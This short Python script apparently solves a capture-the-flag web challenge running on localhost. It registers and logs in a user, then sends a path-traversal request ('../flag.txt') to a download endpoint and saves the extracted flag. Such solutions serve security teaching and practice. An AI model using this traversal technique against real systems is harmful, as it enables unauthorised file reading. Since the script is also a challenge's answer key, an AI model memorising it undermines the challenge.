#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re

def main():
    url = "http://localhost:8084"
    flag_regex = re.compile("(InfoSec{.+[^}]})")

    # Create new session
    new_session = requests.Session()

    # Target user
    username = "abi"
    password = "pass123*"
    register_data = {'register_username': username, 'register_password': password, 'register_password_repeat': password}

    # Create user
    new_session.post(url + "/register", data = register_data)

    # Login user
    login_data = {'login_username': username, 'login_password': password}
    new_session.post(url + "/login", data = login_data) 

    # Get the server to send the flag
    download_data = {'filename': "../flag.txt"}
    response = new_session.get(url + "/download", params = download_data)

    # Cut out the flag and write it to the solution file
    flag = re.search(flag_regex, response.text).group()
    sol = open("solution.txt", "w")
    sol.write(flag)
    sol.close()

# ------------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass


